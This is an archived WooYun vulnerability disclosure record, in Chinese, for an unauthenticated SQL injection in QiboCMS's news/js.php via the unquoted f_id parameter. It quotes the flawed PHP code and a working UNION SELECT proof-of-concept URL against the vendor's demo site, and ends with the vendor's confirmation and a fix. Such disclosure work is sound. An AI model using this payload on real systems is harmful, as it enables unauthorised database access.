{"id": 49056, "wybug_id": "wooyun-2014-075317", "wybug_title": "qibocms 部分系统无需登录注入(demo成功)", "wybug_corp": "齐博CMS", "wybug_author": "′雨。", "wybug_date": "2014-09-09 15:29", "wybug_open_date": "2014-12-08 15:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-08：\t细节向公众公开  简要描述： 不清楚杀哪些系统。 本地没几个qibo的系统 大概看了看b2b 和 企业 都存在这洞以b2b演示 无视GPC。这才应该是最后一弹。 详细说明：  不清楚哪些系统存在 以B2B演示 官方自己慢慢排查把。 WooYun: qibocms B2b 注入一枚 很久前的一个漏洞   这个漏洞的修复是直接去掉了urldecode然后自己就放弃了。        今天再看到这个文件继续看news/js.php中\nif($keyword){\t\t\t$SQL.=\" AND ( \";\t\t\t//$keyword=urldecode($keyword);\t\t\t$keyword=filtrate($keyword);\t\t\t$detail=explode(\" \",$keyword);\t\t\tunset($detail2);\t\t\tforeach( $detail AS $key=>$value){\t\t\t\t$detail2[]=\" BINARY title LIKE '%$value%' \";\t\t\t}\t\t\t$str=implode(\" OR \",$detail2);\n可以看到这里把urldecode注释掉了   然后用filterate来过滤了。那么这样就修复了上次的那个洞     所以这里就没办法了。今天无意看到这上面的几行12-24行左右\nif($type=='hot'||$type=='com'||$type=='new'||$type=='lastview'||$type=='like'){\tif($f_id)\t{\t\tif(is_numeric($f_id)){\t\t\t$SQL=\" fid=$f_id \";\t\t}else{\t\t\t$detail=explode(\",\",$f_id);\t\t\t$SQL=\" fid IN ( \".implode(\",\",$detail).\" ) \";\t\t\t\t}\t}\n\nif(is_numeric($f_id)){\t\t\t$SQL=\" fid=$f_id \";\t\t}else{\t\t\t$detail=explode(\",\",$f_id);\t\t\t$SQL=\" fid IN ( \".implode(\",\",$detail).\" ) \";\t\t\t\t}\n当设置$f_id之后如果不是数字的话 就先切为数组 然后再返回成字符串 但是这里 成字符串之后 没有添加单引号。而且$f_id 并没有被intval 在全局文件中被intval的是$fid这里的是$f_id 所以可以注入了。官网测试\n\n报错了 没单引号构造一下http://b2b.qibosoft.com/news/js.php?f_id=1) UNION SELECT 1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%23&type=hot\n\n成功出数据。   漏洞证明：  \n\n   修复方案：  单引号之。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-10 09:14 厂商回复： 感谢提出来 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-09 15:40 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  放开那些洞洞，让我来！ 你该好好看书才对- -！    \n     2014-09-26 18:58 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  mark一下    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}